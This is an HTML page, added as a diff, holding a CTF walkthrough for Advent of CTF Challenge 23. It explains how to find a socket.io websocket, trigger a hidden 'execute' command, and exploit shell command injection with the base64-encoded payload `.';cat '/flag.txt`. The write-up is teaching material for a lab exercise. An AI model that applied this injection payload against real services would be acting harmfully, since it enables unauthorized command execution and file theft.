@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 21 Dec. 2022 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Advent of CTF - Challenge 23</title>
+<meta name="author" content="Arjen Wiersma" />
+<meta name="generator" content="Org Mode" />
+<meta description='Writings by Arjen'/>
+<link rel='alternate' type='application+rss/xml' title='Writings by Arjen' href='/posts/rss.xml'/>
+<link rel="stylesheet" href="../../../css/theme.css?v=20216e086cf8a20ead56908f3be0bcda6af2531ec1a68c9058ee7495590f57ea" type="text/css">
+</head>
+<body>
+<main id="content" class="content">
+<header>
+<h1 class="title">Advent of CTF - Challenge 23</h1>
+<p class="subtitle" role="doc-subtitle">&ldquo;IRC&rdquo;</p>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgf25f6f3">Challenge</a></li>
+<li><a href="#org7fbbdf1">Solution&#xa0;&#xa0;&#xa0;<span class="tag"><span class="ATTACH">ATTACH</span></span></a></li>
+</ul>
+</div>
+</nav>
+
+<section id="outline-container-orgf25f6f3" class="outline-2">
+<h2 id="orgf25f6f3">Challenge</h2>
+<div class="outline-text-2" id="text-orgf25f6f3">
+<p>
+This challenge centers on the <code>websocket</code> technology. It is commonly used in chat systems and often requires that a programmer implements their own security.
+</p>
+
+<p>
+What you will learn:
+</p>
+
+<ul class="org-ul">
+<li>How to identify websockets</li>
+<li>How to send your own messages</li>
+</ul>
+</div>
+</section>
+
+<section id="outline-container-org7fbbdf1" class="outline-2">
+<h2 id="org7fbbdf1">Solution&#xa0;&#xa0;&#xa0;<span class="tag"><span class="ATTACH">ATTACH</span></span></h2>
+<div class="outline-text-2" id="text-org7fbbdf1">
+<p>
+The challenge starts in a very unusual state; a blank screen with a <code>send</code> button.
+</p>
+
+
+<figure id="org528a5cf">
+<img src="index_att/challenge-start.png" alt="challenge-start.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Challenge start</figcaption>
+</figure>
+
+<p>
+You can send any type of textual message. In the DevTools, under network, there is an odd status response; <code>101</code>. This means that a protocol switch was done. This request is no longer talking <code>HTTP</code>, but something else.
+</p>
+
+<p>
+In the <code>Response</code> tab of the network entry the messages that are sent back and forth can be observed.
+</p>
+
+
+<figure id="org174925c">
+<img src="index_att/chats.png" alt="chats.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>WebSocket traffic</figcaption>
+</figure>
+
+<p>
+In the page source code it is clear that <code>socket.io</code> is used. The javascript can not be directly used in the DevTools, but copying the relevant parts from the <code>index</code> page to the console allows you to play with it from a Javascript environment.
+</p>
+
+<p>
+While doing so you will notice this fragment. It shows that if the <code>msg</code> has a property called <code>code</code> it will do something different.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Discovery of the &ldquo;code&rdquo; command</label><pre class="src src-javascript"><span class="org-keyword">if</span> (msg.command === <span class="org-string">"code"</span>) {
+    $(<span class="org-string">'#messages'</span>).append($(<span class="org-string">'&lt;li&gt;'</span>).html(<span class="org-string">"&lt;pre&gt;"</span> + msg.message + <span class="org-string">"&lt;/pre&gt;"</span>));
+} <span class="org-keyword">else</span> {
+    $(<span class="org-string">'#messages'</span>).append($(<span class="org-string">'&lt;li&gt;'</span>).text(msg.message));
+}
+</pre>
+</div>
+
+<p>
+Taking the plan from before; copy the <code>socket</code> creationg and the <code>socket.on</code> to the Javascript console.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Basic code for the Console</label><pre class="src src-javascript"><span class="org-keyword">var</span> <span class="org-variable-name">socket</span> = io();
+
+socket.on(<span class="org-string">'chat message'</span>, <span class="org-keyword">function</span>(<span class="org-variable-name">msg</span>){
+  console.log(msg.command);
+  <span class="org-keyword">if</span> (msg.command === <span class="org-string">"code"</span>) {
+    $(<span class="org-string">'#messages'</span>).append($(<span class="org-string">'&lt;li&gt;'</span>).html(<span class="org-string">"&lt;pre&gt;"</span> + msg.message + <span class="org-string">"&lt;/pre&gt;"</span>));
+  } <span class="org-keyword">else</span> {
+    $(<span class="org-string">'#messages'</span>).append($(<span class="org-string">'&lt;li&gt;'</span>).text(msg.message));
+  }
+  window.scrollTo(0, document.body.scrollHeight);
+});
+</pre>
+</div>
+
+<p>
+The <code>socket.emit</code> can now be utilized to send messages to the chat application. This happens in a different request then the one of the first load, but due to our logic the output is still visible in the screen. 
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Sending message from the console</label><pre class="src src-javascript">socket.emit(<span class="org-string">'chat message'</span>, {message: <span class="org-string">"Hello from console"</span>});
+</pre>
+</div>
+
+
+<figure id="orgfe15749">
+<img src="index_att/own-messages.png" alt="own-messages.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>DevTools shows the messages</figcaption>
+</figure>
+
+<p>
+As it became clear that there is a <code>command</code> property that can be set, lets add that to the message.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Sending a message with a command</label><pre class="src src-javascript">socket.emit(<span class="org-string">'chat message'</span>, {command: <span class="org-string">"code"</span>, message: <span class="org-string">"Hello from console"</span>});
+</pre>
+</div>
+
+<p>
+It stands to reason that there are other <code>command</code> options as well, given the hint in the code. After a few attempts you will probably ask for <code>help</code>.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Sending a message with a command</label><pre class="src src-javascript">socket.emit(<span class="org-string">'chat message'</span>, {command: <span class="org-string">"help"</span>, message: <span class="org-string">"Hello from console"</span>});
+</pre>
+</div>
+
+<p>
+The response is indeed very helpful; it lists the accepted command types.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>The help response</label><pre class="src src-text">Allowed message types are: help, execute and empty
+</pre>
+</div>
+
+<p>
+The <code>execute</code> type stands out, so lets give that a try. As a <code>message</code> payload anything can be used at this point.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Attempting an execute</label><pre class="src src-javascript">socket.emit(<span class="org-string">'chat message'</span>, {command:<span class="org-string">"execute"</span>, message: <span class="org-string">"something"</span>});
+</pre>
+</div>
+
+<p>
+The result is somewhat surprising. It says that it encountered <code>Invalid Base64</code>.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Execute response to &ldquo;something&rdquo;</label><pre class="src src-text">Invalid BASE64
+</pre>
+</div>
+
+<p>
+After a few experiments it is clear that the message needs to be a valid Base64 payload. In javascript this is done through <code>btoa()</code>.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Attempting an execute</label><pre class="src src-javascript">socket.emit(<span class="org-string">'chat message'</span>, {command:<span class="org-string">"execute"</span>, message: btoa(<span class="org-string">"something"</span>)});
+</pre>
+</div>
+
+<p>
+The result gives a clear path to victory! A command is executed with the payload; <code>ls 'something'</code>. Obviously <code>something</code> does not exist, but it does provide a mechanism to get the flag.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Execute response to btoa(&ldquo;something&rdquo;)</label><pre class="src src-text">ERR: Error: Command failed: /bin/ls 'something'
+ls: something: No such file or directory
+</pre>
+</div>
+
+<p>
+From here on in it becomes a standard command injection. From the tests it is clear the application does something like <code>ls 'USERINPUT'</code>. So the <code>'</code> has to be escaped and then a new command can be entered, that reuses the <code>'</code> at the end. 
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Exploiting the command injection</label><pre class="src src-javascript">socket.emit(<span class="org-string">'chat message'</span>, {command:<span class="org-string">"execute"</span>, message: btoa(<span class="org-string">".';cat '/flag.txt"</span>)});
+</pre>
+</div>
+
+<p>
+After grabbing the points be sure to also grab the badge.
+</p>
+
+
+<figure id="orgff43d8e">
+<img src="./index_att/badge.png" alt="badge.png">
+
+</figure>
+
+<p>
+Go back to the <a href="../../../index.html">homepage</a>.
+</p>
+</div>
+</section>
+</main>
+<footer id="postamble" class="status">
+<p class="author">Author: Arjen Wiersma</p>
+<p class="date">Created: 21 Dec. 2022</p>
+</footer>
+</body>
+</html>
